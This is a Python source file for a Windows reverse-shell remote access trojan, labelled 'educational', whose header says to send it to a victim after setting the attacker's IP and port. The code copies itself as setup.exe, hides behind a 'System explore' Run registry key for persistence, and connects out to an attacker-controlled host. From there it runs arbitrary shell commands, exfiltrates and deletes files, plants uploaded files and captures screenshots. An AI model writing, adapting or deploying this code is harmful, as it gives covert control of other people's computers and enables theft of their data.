#!/usr/bin/python
# ___ UTF-8* ___
# Simple Reverse Shell Written by: Yasser (Yezz123)
# [NOTE] Only for Educational Purpose. [/NOTE] 
#
# Patch / Client.
#
# [!] Send this to Victim. After Changing Ip Address,port.in the line 76

import sys
import socket,subprocess
import traceback
import time
import os
from PIL import ImageGrab
import shutil
from _winreg import *

dist=""
curntfile=sys.argv[0]                   
servername="/setup.exe"
username=os.getenv('USERNAME')

if os.path.exists("C:/Documents and Settings/"+username): 
    dist="C:/Documents and Settings/"+username+"/regky"
    print "found path", dist
    if not os.path.isdir(dist):             
        os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist+servername)
        print "file copied to:",dist+servername
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"System explore",0, REG_SZ, "C:\\Documents and Settings\\"+username+"\\regky\\setup.exe" )
        print "regkey added","C:\\Documents and Settings\\"+username+"\\regky\\setup.exe"
    except:
        pass

elif os.path.exists("C:/Users/"+username): 
    dist="C:/Users/"+username+"/regky"
    print   "found path", dist
    if not os.path.isdir(dist):             
            os.mkdir(dist)
    try:
        shutil.copy2(curntfile, dist+servername)
        print "file copied to:",dist+servername
        aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
        aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(aKey,"System explore",0, REG_SZ, "C:\\Users\\"+username+"\\regky\\setup.exe" )
        print "regkey added","C:\\Users\\"+username+"\\regky\\setup.exe"
    except:
        pass

def do_work( forever = True):


    while True:

        t
        print "Creating the socket"
        s = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout( 5.0)

        
        x = s.getsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE)
        if( x == 0):
            print 'Socket Keepalive off, turning on'
            x = s.setsockopt( socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            print 'setsockopt=', x
        else:
            print 'Socket Keepalive already on'

        try:
            s.connect(('192.168.1.2',666)) #YOUR IP AND PORT FOR REVERSE CONNECTION
        except socket.error:
            print 'Socket connect failed! Loop up and try socket again'
            time.sleep( 10)
            continue

        print 'Socket connect worked!'

        while 1:
            try:
                data = s.recv(1024)
                if data == "quit":
                      break
                elif data.startswith('download')==True:
                    sendFile=data[9:]
                    time.sleep(.5)
                    if os.path.isfile(sendFile):
                        with open(sendFile,'rb')as f:
                            while 1:
                                filedata=f.read()
                                if filedata==None:break
                                s.sendall(filedata)
                        f.close()
                        time.sleep(0.8)
                        s.sendall('EOFEOFX')
                    else:
                        s.send('EOFEOFX')
                        s.send('invalid filename')
                
                elif data.startswith('invalid')==True:
                    s.send('falid invalid filename')
                
                elif data.startswith('del')==True:
                    filename=data[4:]
                    try:
                        os.remove(filename)
                        s.send('Deleted')
                    except os.error:
                        s.send('Invalid filename')

                
                elif data.startswith('cd')==True:
                    path=data[3:]
                    try:
                        os.chdir(path)
                        s.sendall(os.getcwd())
                    except:
                        s.send("path not found")
                
                elif data.startswith('pic')==True:
                    image=data[4:]
                    ImageGrab.grab().save(image, "PNG")
                    s.send('image saved')
                
                elif data.startswith("upload")== True:
                    downFile=data[7:]
                    try:
                        f=open(downFile,'wb')
                        while True:
                            l=s.recv(1024)
                            while 1:
                                if l.endswith('EOFEOFX'):
                                    u=l[:-7]
                                    f.write(u)
                                    break
                                else:
                                    f.write(l)
                                    l=s.recv(1024)
                            break
                        f.close()
                        s.send('Done')
                    except:
                        pass

                else:
                    
                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    

                    if len(stdout_value)==0:
                        s.send("command successfull")
                    else:
                        s.send(stdout_value)

            except socket.timeout:
                print 'Socket timeout, loop and try recv() again'
                time.sleep(0)
                
                continue

            except:
                traceback.print_exc()
                print 'Other Socket err, exit and try creating socket again'
                break

        try:
            s.close()
        except:
            pass


if __name__ == '__main__':

    do_work( True) 